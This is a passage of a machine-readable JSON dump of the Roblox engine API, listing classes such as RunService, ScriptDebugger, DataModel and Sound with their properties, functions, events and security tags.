UserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReloadShaders","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"width","Default":null},{"Type":"int","Name":"height","Default":null}],"Name":"ResizeWindow","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"RenderSettings","tags":["notbrowsable"]},{"ValueType":"AASamples","type":"Property","Name":"AASamples","tags":[],"Class":"RenderSettings"},{"ValueType":"Antialiasing","type":"Property","Name":"Antialiasing","tags":[],"Class":"RenderSettings"},{"ValueType":"int","type":"Property","Name":"AutoFRMLevel","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"DebugDisableInterpolation","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"EagerBulkExecution","tags":[],"Class":"RenderSettings"},{"ValueType":"QualityLevel","type":"Property","Name":"EditQualityLevel","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"EnableFRM","tags":["hidden"],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ExportMergeByMaterial","tags":[],"Class":"RenderSettings"},{"ValueType":"FramerateManagerMode","type":"Property","Name":"FrameRateManager","tags":[],"Class":"RenderSettings"},{"ValueType":"GraphicsMode","type":"Property","Name":"GraphicsMode","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"IsAggregationShown","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"IsSynchronizedWithPhysics","tags":[],"Class":"RenderSettings"},{"ValueType":"int","type":"Property","Name":"MeshCacheSize","tags":[],"Class":"RenderSettings"},{"ValueType":"QualityLevel","type":"Property","Name":"QualityLevel","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ReloadAssets","tags":[],"Class":"RenderSettings"},{"ValueType":"Resolution","type":"Property","Name":"Resolution","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ShowBoundingBoxes","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ShowInterpolationpath","tags":[],"Class":"RenderSettings"},{"ValueType":"int","type":"Property","Name":"TextureCacheSize","tags":[],"Class":"RenderSettings"},{"ReturnType":"int","Arguments":[],"Name":"GetMaxQualityLevel","tags":[],"Class":"RenderSettings","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"ReplicatedFirst","tags":["notCreatable"]},{"ReturnType":"bool","Arguments":[],"Name":"IsDefaultLoadingGuiRemoved","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsFinishedReplicating","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RemoveDefaultLoadingScreen","tags":[],"Class":"ReplicatedFirst","type":"Function"},{"Arguments":[],"Name":"FinishedReplicating","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Event"},{"Arguments":[],"Name":"RemoveDefaultLoadingGuiSignal","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ReplicatedStorage","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"RobloxReplicatedStorage","tags":["notCreatable","notbrowsable"]},{"Superclass":"Instance","type":"Class","Name":"RunService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"int","Name":"priority","Default":null},{"Type":"Function","Name":"function","Default":null}],"Name":"BindToRenderStep","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsClient","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsRunMode","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsRunning","tags":["RobloxScriptSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsServer","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsStudio","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Pause","tags":["PluginSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Reset","tags":["PluginSecurity","deprecated"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Run","tags":["PluginSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Stop","tags":["PluginSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"UnbindFromRenderStep","tags":[],"Class":"RunService","type":"Function"},{"Arguments":[{"Name":"step","Type":"double"}],"Name":"Heartbeat","tags":[],"Class":"RunService","type":"Event"},{"Arguments":[{"Name":"step","Type":"double"}],"Name":"RenderStepped","tags":[],"Class":"RunService","type":"Event"},{"Arguments":[{"Name":"time","Type":"double"},{"Name":"step","Type":"double"}],"Name":"Stepped","tags":[],"Class":"RunService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"RuntimeScriptService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ScriptContext","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"ScriptsDisabled","tags":["LocalUserSecurity"],"Class":"ScriptContext"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetId","Default":null},{"Type":"Instance","Name":"parent","Default":null},{"Type":"string","Name":"name","Default":null}],"Name":"AddCoreScript","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Instance","Name":"parent","Default":null}],"Name":"AddCoreScriptLocal","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"AddStarterScript","tags":["LocalUserSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"bool","Name":"clearHighwaterMark","Default":"true"}],"Name":"GetHeapStats","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetScriptStats","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":"false"}],"Name":"SetCollectScriptStats","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"seconds","Default":null}],"Name":"SetTimeout","tags":["PluginSecurity"],"Class":"ScriptContext","type":"Function"},{"Arguments":[{"Name":"object","Type":"Instance"},{"Name":"member","Type":"string"},{"Name":"script","Type":"Instance"}],"Name":"CamelCaseViolation","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"stackTrace","Type":"string"},{"Name":"script","Type":"Instance"}],"Name":"Error","tags":[],"Class":"ScriptContext","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ScriptDebugger","tags":["notCreatable"]},{"ValueType":"int","type":"Property","Name":"CurrentLine","tags":["readonly"],"Class":"ScriptDebugger"},{"ValueType":"bool","type":"Property","Name":"IsDebugging","tags":["readonly"],"Class":"ScriptDebugger"},{"ValueType":"bool","type":"Property","Name":"IsPaused","tags":["readonly"],"Class":"ScriptDebugger"},{"ValueType":"Object","type":"Property","Name":"Script","tags":["readonly"],"Class":"ScriptDebugger"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"expression","Default":null}],"Name":"AddWatch","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetBreakpoints","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Map","Arguments":[],"Name":"GetGlobals","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Map","Arguments":[{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"GetLocals","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetStack","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Map","Arguments":[{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"GetUpvalues","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"Instance","Name":"watch","Default":null}],"Name":"GetWatchValue","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetWatches","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Resume","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"line","Default":null}],"Name":"SetBreakpoint","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetGlobal","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Variant","Name":"value","Default":null},{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"SetLocal","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Variant","Name":"value","Default":null},{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"SetUpvalue","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepIn","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOut","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOver","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"Arguments":[{"Name":"breakpoint","Type":"Instance"}],"Name":"BreakpointAdded","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"breakpoint","Type":"Instance"}],"Name":"BreakpointRemoved","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"line","Type":"int"}],"Name":"EncounteredBreak","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[],"Name":"Resuming","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"watch","Type":"Instance"}],"Name":"WatchAdded","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"watch","Type":"Instance"}],"Name":"WatchRemoved","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ScriptInformationProvider","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"access","Default":null}],"Name":"SetAccessKey","tags":["RobloxSecurity"],"Class":"ScriptInformationProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAssetUrl","tags":["LocalUserSecurity"],"Class":"ScriptInformationProvider","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"ScriptService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Selection","tags":[]},{"ReturnType":"Objects","Arguments":[],"Name":"Get","tags":["PluginSecurity"],"Class":"Selection","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"selection","Default":null}],"Name":"Set","tags":["PluginSecurity"],"Class":"Selection","type":"Function"},{"Arguments":[],"Name":"SelectionChanged","tags":[],"Class":"Selection","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ServerScriptService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ServerStorage","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ServiceProvider","tags":["notbrowsable"]},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"FindService","tags":[],"Class":"ServiceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"GetService","tags":[],"Class":"ServiceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"getService","tags":["deprecated"],"Class":"ServiceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"service","tags":["deprecated"],"Class":"ServiceProvider","type":"Function"},{"Arguments":[],"Name":"Close","tags":[],"Class":"ServiceProvider","type":"Event"},{"Arguments":[],"Name":"CloseLate","tags":["LocalUserSecurity"],"Class":"ServiceProvider","type":"Event"},{"Arguments":[{"Name":"service","Type":"Instance"}],"Name":"ServiceAdded","tags":[],"Class":"ServiceProvider","type":"Event"},{"Arguments":[{"Name":"service","Type":"Instance"}],"Name":"ServiceRemoving","tags":[],"Class":"ServiceProvider","type":"Event"},{"Superclass":"ServiceProvider","type":"Class","Name":"DataModel","tags":[]},{"ValueType":"int","type":"Property","Name":"CreatorId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"CreatorType","type":"Property","Name":"CreatorType","tags":["readonly"],"Class":"DataModel"},{"ValueType":"GearGenreSetting","type":"Property","Name":"GearGenreSetting","tags":["readonly"],"Class":"DataModel"},{"ValueType":"Genre","type":"Property","Name":"Genre","tags":["readonly"],"Class":"DataModel"},{"ValueType":"bool","type":"Property","Name":"IsPersonalServer","tags":["RobloxScriptSecurity"],"Class":"DataModel"},{"ValueType":"string","type":"Property","Name":"JobId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"bool","type":"Property","Name":"LocalSaveEnabled","tags":["RobloxScriptSecurity","readonly"],"Class":"DataModel"},{"ValueType":"int","type":"Property","Name":"PlaceId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"int","type":"Property","Name":"PlaceVersion","tags":["readonly"],"Class":"DataModel"},{"ValueType":"string","type":"Property","Name":"VIPServerId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"int","type":"Property","Name":"VIPServerOwnerId","tags":["readonly"],"Class":"DataModel"},{"ValueType":"Object","type":"Property","Name":"Workspace","tags":["readonly"],"Class":"DataModel"},{"ValueType":"Object","type":"Property","Name":"lighting","tags":["deprecated","readonly"],"Class":"DataModel"},{"ValueType":"Object","type":"Property","Name":"workspace","tags":["deprecated","readonly"],"Class":"DataModel"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"displayName","Default":null},{"Type":"string","Name":"stat","Default":null}],"Name":"AddStat","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ClearMessage","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"localSave","Default":null}],"Name":"FinishShutdown","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"jobname","Default":null},{"Type":"double","Name":"greaterThan","Default":null}],"Name":"GetJobIntervalPeakFraction","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"jobname","Default":null},{"Type":"double","Name":"greaterThan","Default":null}],"Name":"GetJobTimePeakFraction","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetJobsExtendedStats","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetJobsInfo","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetMessage","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetRemoteBuildMode","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"bool","Name":"synchronous","Default":"false"}],"Name":"HttpGet","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"bool","Name":"synchronous","Default":"false"},{"Type":"string","Name":"contentType","Default":"*/*"}],"Name":"HttpPost","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"GearType","Name":"gearType","Default":null}],"Name":"IsGearTypeAllowed","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsLoaded","tags":[],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Content","Name":"url","Default":null}],"Name":"Load","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetID","Default":null}],"Name":"LoadGame","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"LoadPlugins","tags":["RobloxSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetID","Default":null}],"Name":"LoadWorld","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"stat","Default":null}],"Name":"RemoveStat","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"category","Default":null},{"Type":"string","Name":"action","Default":"custom"},{"Type":"string","Name":"label","Default":"none"},{"Type":"int","Name":"value","Default":"0"}],"Name":"ReportInGoogleAnalytics","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"id","Default":null},{"Type":"string","Name":"key1","Default":null},{"Type":"string","Name":"value1","Default":null},{"Type":"string","Name":"key2","Default":null},{"Type":"string","Name":"value2","Default":null}],"Name":"ReportMeasurement","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Content","Name":"url","Default":null}],"Name":"Save","tags":["RobloxSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveStats","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ServerSave","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"creatorID","Default":null},{"Type":"CreatorType","Name":"creatorType","Default":null}],"Name":"SetCreatorID","tags":["PluginSecurity","deprecated"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"creatorId","Default":null},{"Type":"CreatorType","Name":"creatorType","Default":null}],"Name":"SetCreatorId","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"GearGenreSetting","Name":"genreRestriction","Default":null},{"Type":"int","Name":"allowedGenres","Default":null}],"Name":"SetGearSettings","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Genre","Name":"genre","Default":null}],"Name":"SetGenre","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"seconds","Default":null}],"Name":"SetJobsExtendedStatsWindow","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null}],"Name":"SetMessage","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetMessageBrickCount","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeID","Default":null},{"Type":"bool","Name":"robloxPlace","Default":"false"}],"Name":"SetPlaceID","tags":["PluginSecurity","deprecated"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"bool","Name":"robloxPlace","Default":"false"}],"Name":"SetPlaceId","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"SetPlaceVersion","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"buildModeEnabled","Default":null}],"Name":"SetRemoteBuildMode","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"info","Default":null}],"Name":"SetScreenshotInfo","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetServerSaveUrl","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"universeId","Default":null}],"Name":"SetUniverseId","tags":["PluginSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"newId","Default":null}],"Name":"SetVIPServerId","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"newId","Default":null}],"Name":"SetVIPServerOwnerId","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"info","Default":null}],"Name":"SetVideoInfo","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Shutdown","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ToggleTools","tags":["LocalUserSecurity"],"Class":"DataModel","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"HttpGetAsync","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"string","Name":"contentType","Default":"*/*"}],"Name":"HttpPostAsync","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"SaveFilter","Name":"saveFilter","Default":"SaveAll"}],"Name":"SavePlace","tags":[],"Class":"DataModel","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[],"Name":"SaveToRoblox","tags":["RobloxScriptSecurity"],"Class":"DataModel","type":"YieldFunction"},{"Arguments":[],"Name":"AllowedGearTypeChanged","tags":[],"Class":"DataModel","type":"Event"},{"Arguments":[{"Name":"betterQuality","Type":"bool"}],"Name":"GraphicsQualityChangeRequest","tags":[],"Class":"DataModel","type":"Event"},{"Arguments":[{"Name":"object","Type":"Instance"},{"Name":"descriptor","Type":"Property"}],"Name":"ItemChanged","tags":[],"Class":"DataModel","type":"Event"},{"Arguments":[],"Name":"Loaded","tags":[],"Class":"DataModel","type":"Event"},{"ReturnType":"Tuple","Arguments":[],"Name":"OnClose","tags":[],"Class":"DataModel","type":"Callback"},{"ReturnType":"bool","Arguments":[],"Name":"RequestShutdown","tags":["RobloxScriptSecurity","noyield"],"Class":"DataModel","type":"Callback"},{"Superclass":"ServiceProvider","type":"Class","Name":"GenericSettings","tags":[]},{"Superclass":"GenericSettings","type":"Class","Name":"GlobalSettings","tags":["notbrowsable"]},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"GetFFlag","tags":[],"Class":"GlobalSettings","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"GetFVariable","tags":[],"Class":"GlobalSettings","type":"Function"},{"ReturnType":"Dictionary","Arguments":[],"Name":"GetFVariables","tags":["RobloxScriptSecurity"],"Class":"GlobalSettings","type":"Function"},{"Superclass":"GenericSettings","type":"Class","Name":"UserSettings","tags":[]},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"IsUserFeatureEnabled","tags":[],"Class":"UserSettings","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Reset","tags":[],"Class":"UserSettings","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Sky","tags":[]},{"ValueType":"bool","type":"Property","Name":"CelestialBodiesShown","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxBk","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxDn","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxFt","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxLf","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxRt","tags":[],"Class":"Sky"},{"ValueType":"Content","type":"Property","Name":"SkyboxUp","tags":[],"Class":"Sky"},{"ValueType":"int","type":"Property","Name":"StarCount","tags":[],"Class":"Sky"},{"Superclass":"Instance","type":"Class","Name":"Smoke","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Color","tags":[],"Class":"Smoke"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Smoke"},{"ValueType":"float","type":"Property","Name":"Opacity","tags":[],"Class":"Smoke"},{"ValueType":"float","type":"Property","Name":"RiseVelocity","tags":[],"Class":"Smoke"},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"Smoke"},{"Superclass":"Instance","type":"Class","Name":"SocialService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"bestFriendUrl","Default":null}],"Name":"SetBestFriendUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"friendUrl","Default":null}],"Name":"SetFriendUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"groupRankUrl","Default":null}],"Name":"SetGroupRankUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"groupRoleUrl","Default":null}],"Name":"SetGroupRoleUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"groupUrl","Default":null}],"Name":"SetGroupUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"stuffUrl","Default":null}],"Name":"SetPackageContentsUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"stuffUrl","Default":null}],"Name":"SetStuffUrl","tags":["LocalUserSecurity"],"Class":"SocialService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Sound","tags":[]},{"ValueType":"bool","type":"Property","Name":"IsPaused","tags":["readonly"],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"IsPlaying","tags":["readonly"],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"Looped","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"MaxDistance","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"MinDistance","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"Pitch","tags":[],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"PlayOnRemove","tags":[],"Class":"Sound"},{"ValueType":"Content","type":"Property","Name":"SoundId","tags":[],"Class":"Sound"},{"ValueType":"double","type":"Property","Name":"TimeLength","tags":["readonly"],"Class":"Sound"},{"ValueType":"double","type":"Property","Name":"TimePosition","tags":[],"Class":"Sound"},{"ValueType":"float","type":"Property","Name":"Volume","tags":[],"Class":"Sound"},{"ValueType":"bool","type":"Property","Name":"isPlaying","tags":["deprecated","readonly"],"Class":"Sound"},{"ReturnType":"void","Arguments":[],"Name":"Pause","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Play","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Resume","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Stop","tags":[],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"pause","tags":["deprecated"],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"play","tags":["deprecated"],"Class":"Sound","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"stop","tags":["deprecated"],"Class":"Sound","type":"Function"},{"Arguments":[{"Name":"soundId","Type":"string"},{"Name":"numOfTimesLooped","Type":"int"}],"Name":"DidLoop","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Ended","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Paused","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Played","tags":[],"Class":"Sound","type":"Event"},{"Arguments":[{"Name":"soundId","Type":"string"}],"Name":"Stopped","tags":[],"Class":"Sound","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"SoundService","tags":["notCreatable"]},{"ValueType":"ReverbType","type":"Property","Name":"AmbientReverb","tags":[],"Class":"SoundService"},{"ValueType":"float","type":"Property","Name":"DistanceFactor","tags":[],"Class":"SoundService"},{"ValueType":"float","type":"Property","Name":"DopplerScale","tags":[],"Class":"SoundService"},{"ValueType":"float","type":"Property","Name":"RolloffScale","tags":[],"Class":"SoundService"},{"ReturnType":"Tuple","Arguments":[],"Name":"GetListener","tags":[],"Class":"SoundService","type":"Function"}